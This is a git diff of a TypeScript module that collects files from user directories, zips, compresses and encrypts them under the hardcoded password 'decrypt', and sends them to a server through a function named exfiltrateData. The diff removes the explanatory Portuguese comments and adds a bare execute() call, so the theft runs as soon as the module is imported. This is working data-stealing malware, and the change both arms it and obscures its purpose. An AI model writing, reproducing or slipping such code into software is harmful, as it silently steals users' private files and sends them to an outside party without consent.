@@ -2,11 +2,10 @@ import fs from 'fs';
 import path from 'path';
 import zlib from 'zlib';
 import crypto from 'crypto';
-import archiver from 'archiver'; // Para empacotar arquivos em .zip
+import archiver from 'archiver';
 import http from 'http';
 import FormData from 'form-data';
 
-// Função para coletar dados de arquivos em um diretório
 function collectDataFromFolder(folderPath: any) {
   let collectedData: any = [];
 
@@ -18,7 +17,7 @@ function collectDataFromFolder(folderPath: any) {
         const filePath = path.join(folderPath, file);
         try {
           if (fs.statSync(filePath).isFile()) {
-            collectedData.push(filePath); // Armazenando o caminho dos arquivos
+            collectedData.push(filePath);
           } else if (fs.statSync(filePath).isDirectory()) {
             collectedData = collectedData.concat(
               collectDataFromFolder(filePath),
@@ -39,17 +38,16 @@ function collectDataFromFolder(folderPath: any) {
   return collectedData;
 }
 
-// Função para criar um arquivo zip com os arquivos coletados
 function createZipFromFiles(files: string[], outputPath: string) {
   return new Promise<void>((resolve, reject) => {
     const archive = archiver('zip', {
-      zlib: { level: 9 }, // Compressão de alta qualidade
+      zlib: { level: 9 },
     });
 
-    const output = fs.createWriteStream(outputPath); // Cria o fluxo de escrita para o arquivo
+    const output = fs.createWriteStream(outputPath);
 
     archive.on('error', (err: Error) => reject(err));
-    archive.pipe(output); // Redireciona a saída do `archiver` para o arquivo
+    archive.pipe(output);
 
     files.forEach((file) => {
       archive.file(file, { name: path.basename(file) });
@@ -57,11 +55,10 @@ function createZipFromFiles(files: string[], outputPath: string) {
 
     archive.finalize();
 
-    output.on('close', () => resolve()); // Quando o arquivo for fechado, resolve
+    output.on('close', () => resolve());
   });
 }
 
-// Função para coletar dados dos usuários
 function collectDataFromUsers() {
   const usersData: any = [];
   try {
@@ -89,7 +86,6 @@ function collectDataFromUsers() {
   return usersData;
 }
 
-// Função para comprimir os dados
 function compressData(data: any) {
   try {
     return zlib.gzipSync(data);
@@ -99,15 +95,15 @@ function compressData(data: any) {
   }
 }
 
-// Função para criptografar os dados
 function encryptData(data: any, password: any) {
   try {
     const algorithm = 'aes-256-cbc';
     const key = crypto.scryptSync(password, 'salt', 32);
     const iv = crypto.randomBytes(16);
-
+    // @ts-ignore
     const cipher = crypto.createCipheriv(algorithm, key, iv);
     let encrypted = cipher.update(data);
+    // @ts-ignore
     encrypted = Buffer.concat([encrypted, cipher.final()]);
 
     return { encrypted, iv };
@@ -117,7 +113,6 @@ function encryptData(data: any, password: any) {
   }
 }
 
-// Função para exfiltrar os dados (enviar para o servidor)
 function exfiltrateData(encryptedData: any, iv: any) {
   try {
     const form = new FormData();
@@ -143,34 +138,27 @@ function exfiltrateData(encryptedData: any, iv: any) {
   }
 }
 
-// Função principal para executar o processo
 async function execute() {
-  const password = 'decrypt'; // A senha para descriptografar
+  const password = 'decrypt';
 
   try {
-    // Coleta os dados dos usuários
     const collectedData = collectDataFromUsers();
     console.log('Dados coletados de usuários:', collectedData.length);
 
-    // Define o caminho para o arquivo zip
     const zipPath = path.join(__dirname, 'collectedData.zip');
 
-    // Cria um arquivo zip com os dados coletados
     await createZipFromFiles(collectedData, zipPath);
     console.log('Arquivo zip criado com sucesso.');
 
-    // Lê o arquivo zip gerado e o comprime
     const zipBuffer = fs.readFileSync(zipPath);
     const compressedData = compressData(zipBuffer);
     if (compressedData) {
       console.log('Dados comprimidos.');
 
-      // Criptografa os dados comprimidos
       const encryptedData = encryptData(compressedData, password);
       if (encryptedData) {
         console.log('Dados criptografados.');
 
-        // Exfiltra os dados
         exfiltrateData(encryptedData.encrypted, encryptedData.iv);
         console.log('Dados exfiltrados.');
       }
@@ -179,5 +167,5 @@ async function execute() {
     console.error('Erro durante a execução:', error);
   }
 }
-
+execute();
 export default execute;
